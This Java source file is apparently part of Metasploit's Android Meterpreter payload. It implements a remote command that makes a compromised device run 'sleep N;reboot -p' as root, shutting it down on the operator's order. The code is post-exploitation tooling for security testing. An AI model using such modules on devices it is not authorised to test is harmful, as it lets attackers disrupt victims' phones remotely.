package com.metasploit.meterpreter.android;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

public class device_shutdown_android implements Command {

	private static final int TLV_EXTENSIONS = 20000;
	private static final int TLV_TYPE_SHUTDOWN_TIMER = TLVPacket.TLV_META_TYPE_UINT
			| (TLV_EXTENSIONS + 9020);
	private static final int TLV_TYPE_SHUTDOWN_OK = TLVPacket.TLV_META_TYPE_BOOL
			| (TLV_EXTENSIONS + 9021);

	@Override
	public int execute(Meterpreter meterpreter, TLVPacket request,
			TLVPacket response) throws Exception {

		int nSeconds = request.getIntValue(TLV_TYPE_SHUTDOWN_TIMER);

		try {
			Process proc = Runtime.getRuntime().exec(
					new String[] { "su", "-c",
							"sleep " + nSeconds + ";reboot -p" });
			response.add(TLV_TYPE_SHUTDOWN_OK, true);
			proc.waitFor();

		} catch (Exception ex) {
			response.add(TLV_TYPE_SHUTDOWN_OK, false);
		}

		return ERROR_SUCCESS;
	}

}